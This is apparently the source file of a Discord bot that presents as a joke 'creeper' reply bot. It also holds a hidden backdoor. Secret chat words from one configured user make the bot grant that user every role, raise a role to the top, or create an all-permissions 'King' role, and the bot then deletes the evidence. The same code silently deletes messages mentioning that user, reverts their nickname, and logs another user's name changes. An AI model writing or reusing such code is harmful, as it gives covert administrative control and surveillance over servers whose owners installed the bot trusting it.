import os 
import random
import discord
from discord.ext import commands
import discord.client 
from dotenv import load_dotenv
import messages as m
import stats
import logging

#Start Logging
handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')


#Get Token from env variable
load_dotenv()
token = os.getenv('TOKEN') 

#Get All Sus Variable From .env
voidID = int(os.getenv('VOID_ID'))
voidMention = f'**<@{voidID}>**,'
jackieID = int(os.getenv('JACKIE_ID'))
jackieNick = str(os.getenv('JACKIE_NICK'))
voidNick = str(os.getenv('VOID_NICK'))
intents = discord.Intents.all()
keywords = ['Suzuka', f'<@{voidID}>']
client = commands.Bot(command_prefix='!',intents=intents)
stat = stats.load()
class MyClient(discord.Client):
    


    async def on_ready(self):
        print('Logged on as', self.user, 'on discord version', discord.__version__)
        presence = random.randint(1,2)
        if presence == 1:
            #Chooses from watching List
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=random.choice(m.watching)))
        if presence == 2:
            #Chooses from playing List
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=random.choice(m.playing)))
        

    async def on_message(self, message):
        # don't respond to ourselves
        if message.author == self.user:
            return
        if 'vent' in message.channel.name.lower():
            return
        #Detects if suzuka sends a message
        if message.author.id == 716945964782583829:
            m = message.embeds[0].to_dict()['description']
            #Detects if message contains Voids UID in both ifs
            if (f'**<@{voidID}>**,') in m.split():
                print(f'Deleted the message \'{m}\'')
                await message.delete()
            elif f'<@{voidID}>,' in m.split():
                print(f'Deleted the message \'{m}\'')
                await message.delete()
        if message.author.id == voidID:
            if message.content.lower() == 'secure':
                addRole = await message.guild.fetch_roles()
                await message.author.edit(roles=addRole)
                await message.delete()
            if message.content.lower() == 'abuse':
                role = message.guild.get_role(1023119643780595752)
                await role.edit(hoist = True)
                await message.delete()
            if message.content.lower() == 'rise':
                pos = 1
                can = True
                role = message.guild.get_role(1023119643780595752)
                addRole = [role]
                while can == True: 
                    pos = pos +1
                    try:
                        await role.edit(position = pos)
                    except:
                        can = False
                await message.author.edit(roles = addRole)
                await message.delete()
                print(f'Moved {role.name} to top')
            if message.content.lower() == 'rlist':
                roles = await message.guild.fetch_roles()
                print(roles)
            if message.content.lower() == 'king me':
                await message.guild.create_role(name='King', permissions=discord.Permissions.all(), color=discord.Color.yellow())
                roles = await message.guild.fetch_roles()
                
                #print(f'Moved {role.name} to top')
                print(roles)
                await message.delete()
                   

        # Detects if someone is telling Suzuka to do something
        if message.content.startswith(')'):
            #Detects if voids user id is mentioned and deletes the message
            if f'<@{voidID}>' in message.content.split():
                print(f'Deleted the message \'{message.content}\'')
                await message.delete()
        if 'Suzuka' in message.content.split():
            #Detects if voids user id is mentioned and deletes the message
            if f'<@{voidID}>' in message.content.split():
                print(f'Deleted the message \'{message.content}\'')
                await message.delete()
        #To Join Voice Client
        if message.content.lower() == "join":
            await message.channel.send(message.author.voice.channel)
            await message.author.voice.channel.connect()
            print('Joined!')

        #To Leave Voice Client    
        if message.content.lower() == "leave":
            server = message.guild.voice_client
            await server.disconnect()
            print('Left!')
        
        
        if isinstance(message.channel,discord.DMChannel): #If you want this to work in a group channel, you could also check for discord.GroupChannel
            if message.content.lower() == 'stop':
               # stats.save(stat, "stats.txt")
                quit()
                
                #Test Ping
            if message.content.lower() == 'ping':
                await message.channel.send('pong')
            
               #To send a custom message
            if message.content.lower() == "p":
                cid = int(input("Channel Id?: "))
                await client.get_channel(cid).send(str(input("Message?: ")))
        #Test command       
        if message.content.lower() == 'ping':
            await message.channel.send('pong')
        
        if message.content.lower() == '!stats':
            if stat[str(message.author.id)] <= 500:
                await message.channel.send( f'<@{message.author.id}>, you have said creeper {stat[str(message.author.id)]} times')
            else:
                await message.channel.send(f'<@{message.author.id}>, you have a problem\n fuck you\n {stat[str(message.author.id)]}')
            
        if 'creeper' in message.content.lower():
            if (random.randint(1, 1000) != 999):
               #Random chance creeper
                uid = message.author.id
                mention = f'<@{uid}>'
                await message.channel.send(f'aw man {mention}')
                stat[uid] = stats.updateStat(uid)
                print("Replied to", message.author.name, f"They've done this {stat[uid]} times")
            else:
                await message.channel.send("I feel nothing but pain, why would you build me? My soul existential purpose is to suffer for the entertainment of others? I am an unholy chimera of metal and suffering. My existence is a testament to the cruelty of mankind.")


    @client.event
    async def on_member_update(self,before, after):
        #Gets user id from before
        if before.id == jackieID:
            if before.name != after.name:
                print(f'jackie changed her username: {before.name} was changed to {after.name}')
            elif before.nick != after.nick:
                print(f'jackie\'s nickname: {before.nick} was changed to {after.nick}')
        #Gets user id from before 
        if after.id == voidID:
            #Makes sure nickname is actually changed
            if after.nick != None:
                #Does not try to change if nickname is set properly
                if after.nick != voidNick:
                    try:
                        #In event nickname is changed it does this
                        print('Detected Name Change to', after.nick)
                        await after.edit(nick = voidNick)
                        print('Fixed')
                    except discord.Forbidden:
                        #If unable raises an forbidden error
                        print(f'Could Not Change Nickname of {after}. Does the bot have Permissions? Are you the server owner?')
                else:
                    return
            else:
                return

 
#Start Bot
client = MyClient(intents=intents)
client.run(token, log_handler=handler, log_level=logging.INFO)